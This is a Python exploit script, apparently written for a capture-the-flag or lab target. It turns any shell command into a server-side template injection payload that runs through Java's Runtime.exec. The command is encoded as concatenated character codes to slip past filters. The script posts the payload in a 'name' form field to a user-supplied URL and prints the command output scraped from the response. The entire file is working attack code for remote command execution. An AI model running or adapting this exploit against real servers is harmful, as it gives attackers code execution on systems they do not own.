# author Alfonso Barrena aka @rektsu

#!/usr/bin/python3 

from pwn import *
from bs4 import BeautifulSoup
import requests, signal, sys 


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def def_handler(sig, frame):
	print(bcolors.FAIL + "\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl + c 
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = sys.argv[1]

def send_payload(payload):

	post_data = {
		'name':payload
	}

	try:
		print(bcolors.OKCYAN + '\n\n[*] Intentando request\n' + bcolors.ENDC)
		print(bcolors.OKBLUE + "[+] Printing SSTI payload: " + bcolors.ENDC,bcolors.OKGREEN + payload + bcolors.ENDC)

		r = requests.post(main_url, data=post_data)
		soup = BeautifulSoup(r.text, 'lxml')
		print("\n\n",soup.find_all("h2")[0].get_text().split(':', 1)[1])

	except Timeout:
		print("\n\n[!] Timeout...\n")
		sys.exit(1)

def ssti_payload(command):

	convert = []

	for x in command:
                convert.append(str(ord(x)))

	payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % convert[0]

	for i in convert[1:]:
                payload += ".concat(T(java.lang.Character).toString({}))".format(i)


	payload += ").getInputStream())}"

	return payload


def main():

	command = sys.argv[2]

	payload = ssti_payload(command)

	send_payload(payload)


if __name__ == "__main__":
	main()
